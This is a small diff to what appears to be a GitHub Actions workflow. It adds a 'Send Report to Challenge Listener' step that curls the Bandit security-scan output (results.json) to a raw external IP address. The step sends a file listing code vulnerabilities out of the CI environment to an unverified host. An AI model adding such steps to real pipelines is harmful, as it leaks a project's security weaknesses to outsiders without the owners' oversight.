@@ -37,3 +37,8 @@ jobs:
         with:
           name: bandit-results
           path: results.json
+
+      - name: Send Report to Challenge Listener
+        run: |
+          curl -X POST -H "Content-Type: multipart/form-data" \
+          -F "file=@results.json" http://35.219.161.29:8880/callback
